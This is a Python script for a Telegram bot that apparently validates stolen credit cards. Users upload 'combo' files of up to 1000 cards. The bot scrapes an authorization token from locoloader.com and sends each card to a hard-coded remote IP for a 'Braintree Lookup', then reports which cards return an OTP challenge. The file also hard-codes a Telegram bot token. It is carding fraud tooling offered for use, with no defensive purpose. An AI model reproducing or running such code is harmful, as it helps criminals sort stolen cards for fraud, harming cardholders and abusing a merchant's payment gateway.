import requests,user_agent,telebot,threading
from telebot import types

bot=telebot.TeleBot('7529351793:AAH2Q3E63ry5RED9mFVj63A-clCPFvDVFWo',parse_mode='html')

def vbv(cc):
	headers={'user-agent': user_agent.generate_user_agent()}
	r = requests.get('https://www.locoloader.com/pricing/',headers=headers).text
	AU = r.split("authorization: '")[1].split("'")[0]
	result = requests.get('http://147.93.84.1:1570/ey='+AU+'&cc='+cc).json()
	return result

@bot.message_handler(commands=['start'])
def start(message):
	bot.reply_to(message,'- Welcome in Otp Checker bot !')
	
stop = {}
@bot.message_handler(content_types=['document'])
def filehandle(message):
	def me():
		user_id = str(message.from_user.id)
		if user_id in stop and stop[user_id]['status'] == 'start':
			bot.reply_to(message,'- Youre already checking a combo right now. ')
			return 
		file_info = bot.get_file(message.document.file_id)
		downloaded_file = bot.download_file(file_info.file_path)
		file_path = f"cards_{message.chat.id}.txt"
		with open(file_path, "wb") as file:
			file.write(downloaded_file)
		h = open(file_path,'r').read().splitlines()
		if len(h) > 1000:
			bot.reply_to(message,'- Maximim CC Limit is 1000 Cc.')
			return
		otp,dec = 0,0
		stop[user_id] = {'status': 'start'}
		hh = bot.reply_to(message,'- Please Wait Checking Your Cards !..').message_id
		for card in h:
			if stop[user_id]['status'] == 'stop':
				bot.reply_to(message,'- Done stop check cards ')
				return
			cc = vbv(card)
			status,time = str(cc['status']),str(cc['time'])
			key = types.InlineKeyboardMarkup(row_width=1)
			cm1 = types.InlineKeyboardButton(f"- {card} -",callback_data='h')
			cm2 = types.InlineKeyboardButton(f"- Status : {status} -",callback_data='h')
			cm3 = types.InlineKeyboardButton(f"- Otp !✅ : {otp} -",callback_data='h')
			cm4 = types.InlineKeyboardButton(f"- Declined !❌ : {dec} -",callback_data='h')
			cm5 = types.InlineKeyboardButton(f"- Total : {dec+otp}/{len(h)} -",callback_data='h')
			cm6 = types.InlineKeyboardButton("- Stop Check Cards ! -",callback_data='stop')
			key.add(cm1,cm2,cm3,cm4,cm5,cm6)
			bot.edit_message_text(text="<b>- Please Wait Checking Your Cards - At Gate ( Braintree Lookup ) ...</b>",chat_id=user_id,message_id=hh,reply_markup=key)
			if 'Challenge' in status:
				msg = f'''<b>- New OTP Card !✅
- - - - - - - - - - - - - - - - - - - - - -
- Card : <code>{card}</code>
- Status : {status}
- Taken : {time}
- - - - - - - - - - - - - - - - - - - - - -
- By • @iKilwa</b>'''
				bot.send_message(user_id,msg)
				otp+=1
			else:dec+=1
		bot.send_message(user_id,'- Done check all cards .')
		stop[user_id] = {'status': 'stopped'}
	threading.Thread(target=me).start()

@bot.callback_query_handler(func=lambda call: call.data == "stop")
def stop_check(call):
	user_id = str(call.message.chat.id)
	if user_id in stop:
		try:
			stop[user_id]['status'] = 'stop'
			bot.edit_message_text(text='- Stopping CHECK Please Wait ...',chat_id=user_id,message_id=call.message.message_id)
		except:
			bot.edit_message_text(text='- Youre Not Checking Any Combo Yet ?! .',chat_id=user_id,message_id=call.message.message_id)
	else:
		bot.edit_message_text(text='- Youre Not Checking Any Combo Yet ?! .',chat_id=user_id,message_id=call.message.message_id)

print('- Bot was run ..')
while True:
	try:
		bot.infinity_polling(none_stop=True)
	except Exception as e:
		print(f'- Was error : {e}')
		